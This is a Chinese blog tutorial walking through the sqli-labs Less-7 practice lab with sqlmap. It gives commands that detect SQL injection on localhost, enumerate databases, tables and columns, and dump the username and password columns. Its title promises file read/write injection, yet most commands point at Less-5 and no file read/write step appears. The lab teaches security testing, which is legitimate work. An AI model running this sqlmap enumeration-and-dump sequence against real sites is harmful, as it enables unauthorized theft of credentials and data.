# 原创
：  （slmap）【sqli-labs7】GET请求、文件读写注入：使用方法

# （slmap）【sqli-labs7】GET请求、文件读写注入：使用方法

**目录**

[一、文件读写注入（sqlmap）SQL注入基本步骤：](#SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4%EF%BC%9A)

[二、扩展](#%E6%89%A9%E5%B1%95)

[2.1、命令扩展](#%E5%91%BD%E4%BB%A4%E6%89%A9%E5%B1%95)

[2.2、注：](#%E6%B3%A8%EF%BC%9A)

[2.3、推荐：](#%C2%A0%E6%8E%A8%E8%8D%90%EF%BC%9A)

[ 三、Less7（GET-Dump into outfile - String）](#Less5%EF%BC%88GET-Double%20injection-Single%20Quotes%20-String%EF%BC%89)

[ 3.1、第一步：检测是否存在注入](#%C2%A0%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E6%A3%80%E6%B5%8B%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5)

[基础操作](#%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C)

[3.2、第二步：爆数据库名](#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D)

[命令](#%E5%91%BD%E4%BB%A4)

[基础操作](#%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C)

[3.3、第三步：爆数据库表名](#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E5%90%8D)

[命令](#%E5%91%BD%E4%BB%A4)

[基础操作](#%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C)

[3.4、第四步：爆字段名](#%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E7%88%86%E5%AD%97%E6%AE%B5%E5%90%8D)

[命令：](#%E5%91%BD%E4%BB%A4%EF%BC%9A)

[基础操作](#%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C)

[3.5、第五步：爆数据](#%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E7%88%86%E6%95%B0%E6%8D%AE)

[命令：](#%E5%91%BD%E4%BB%A4%EF%BC%9A)

[基础操作：](#%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C%EF%BC%9A)

---


（sqlmap使用的步骤基本上一样，但是不能小看简单的重复练习，越是简单的，越要牢记）

## 一、文件读写注入（sqlmap）SQL注入基本步骤：

> 
第一步：注入点测试
第二步：爆数据库名
第三步：爆数据库表
第四步：爆字段
第五步：爆数据


---


---


## 二、扩展

> 
<h3>2.1、命令扩展</h3>
（1）如果提前找到了数据库类型
--dbms +数据库
（2）扫描的等级
最高等级是
--leve=5 --risk=3
<hr/>
<h3>2.2、注：</h3>
我使用Windows中的sqlmap做，会带上python sqlmap.py
Linux：直接sqlmap +……
<hr/>
<h3>2.3、推荐：</h3>
[(手工)【sqli-labs7】GET请求、文件读写注入：使用方法<img alt="icon-default.png?t=M4AD" src="https://csdnimg.cn/release/blog_editor_html/release2.1.3/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M4AD"/>https://blog.csdn.net/qq_53079406/article/details/125038406?spm=1001.2014.3001.5501](https://blog.csdn.net/qq_53079406/article/details/125038406?spm=1001.2014.3001.5501)



### 2.2、注：

---


---


##  三、Less7（GET-Dump into outfile - String）

> 
<h3> 3.1、第一步：检测是否存在注入</h3>
<h4>基础操作</h4>
python sqlmap.py 'http://localhost:8080/sqli-labs-master/Less-7/?id=1' --batch
--batch是使用默认设置

 



 

其实环境都扫出来了 
就可以再加上--dbms mysql了



> 
<h3>3.2、第二步：爆数据库名</h3>
<h4>命令</h4>
#获取全部数据库
sqlmap.py -u url --dbs --batch
---------
#获取当前数据库
sqlmap.py -u url --current-dbs --batch
<hr/>
<h4>基础操作</h4>
python sqlmap.py -u 'http://localhost:8080/sqli-labs-master/Less-5/?id=1' --dbs --batch

 

 <img alt="" height="785" src="https://img-blog.csdnimg.cn/df3c61d260284672a02881a4526fb899.png" width="1200"/>
 




#### 基础操作

> 
<h3>3.3、第三步：爆数据库表名</h3>
<h4>命令</h4>
python sqlmap.py -u url -D DB --tables --batch
<hr/>
<h4>基础操作</h4>
python sqlmap.py -u 'http://localhost:8080/sqli-labs-master/Less-5/?id=1' -D security --tables --batch

 

 <img alt="" height="785" src="https://img-blog.csdnimg.cn/273d19d5d90947feab964007e3238461.png" width="1200"/>
 




#### 基础操作

> 
<h3>3.4、第四步：爆字段名</h3>
<h4>命令：</h4>
sqlmap.py -u url -D DB -T TBL --columns --batch
<hr/>
<h4>基础操作</h4>
python sqlmap.py -u 'http://localhost:8080/sqli-labs-master/Less-5/?id=1' -D security -T users --columns --batch

         


 




#### 基础操作

> 
<h3>3.5、第五步：爆数据</h3>
<h4>命令：</h4>
sqlmap.py -u url -D DB -T TBL -C "COL1,COL2" --dump --batch
<hr/>
<h4>基础操作：</h4>
python sqlmap.py -u 'http://localhost:8080/sqli-labs-master/Less-5/?id=1' -D security -T users -C "username,password" --dump --batch

 

 <img alt="" height="785" src="https://img-blog.csdnimg.cn/c480fe9b43ee4a57aa08abc302671d4f.png" width="1200"/>
 




#### 基础操作：
